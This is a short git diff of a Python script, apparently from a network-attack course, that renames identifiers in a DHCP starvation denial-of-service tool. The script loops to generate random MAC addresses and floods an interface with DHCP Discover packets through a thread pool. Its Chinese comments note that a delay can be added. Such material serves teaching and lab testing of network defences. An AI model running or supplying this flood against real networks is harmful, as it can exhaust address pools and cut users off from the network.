@@ -7,23 +7,23 @@
 # https://ke.qq.com/course/271956?tuin=24199d8a
 
 from multiprocessing.pool import ThreadPool
-from part1_classic_protocols.tools.random_mac import Random_MAC
-from DHCP_Discover import DHCP_Discover_Sendonly
+from tools.random_mac import random_mac
+from net_6_dhcp.dhcp_discover import dhcp_discover_sendonly
 
 pool = ThreadPool(processes=10)
 
 
-def DHCP_Discover_DoS(ifname):
+def dhcp_discover_dos(ifname):
     i = 1
     while i < 300:
-        MAC_ADD = Random_MAC()  # 随机产生MAC地址！
-        print(MAC_ADD)  # 打印随机产生的MAC地址！
+        mac_add = random_mac()  # 随机产生MAC地址！
+        print(mac_add)  # 打印随机产生的MAC地址！
         # 如果希望慢一点,可以设置延时参数
-        pool.apply_async(DHCP_Discover_Sendonly, args=(ifname, MAC_ADD, 0))
+        pool.apply_async(dhcp_discover_sendonly, args=(ifname, mac_add, 0))
         i += 1
     pool.close()
 
 
 if __name__ == '__main__':
     # 使用Linux解释器 & WIN解释器
-    DHCP_Discover_DoS('Net1')
+    dhcp_discover_dos('Net1')
